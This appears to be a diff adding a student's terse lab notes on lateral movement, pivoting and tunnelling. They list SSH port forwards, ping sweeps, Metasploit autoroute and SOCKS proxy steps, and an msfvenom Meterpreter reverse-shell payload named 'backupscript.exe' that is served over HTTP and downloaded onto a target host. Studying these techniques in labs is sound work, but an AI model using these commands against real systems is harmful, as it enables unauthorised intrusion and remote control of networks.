@@ -1,1 +1,39 @@
+Laternal movement:  same network
+Pivot:  cross network
+Tunnel:  key in toy
 
+
+ifconfig / ipconfig
+
+netstat -antp | grep 1234
+
+
+Steps:
+  get foothold
+  ping internal network
+  setup tunnel
+  atc
+
+
+Port forwards:
+  ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+  ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+  ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+  
+  meterpreter > help portfwd
+
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+msfconsole -q
+use exploit/multi/handler
+scp playload.exe ubuntu@10.129.202.64:~/
+python3 -m http.server 8123
+curl  / Invoke-WebRequest -Uri "http://172.16.5.129:8123/playload.exe" -OutFile "C:\playload.exe"
+
+
+Ping sweep:
+  for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+  1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+  meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+  or
+  msf6 > use auxiliary/server/socks_proxy
+  meterpreter > run autoroute -s 172.16.5.0/23
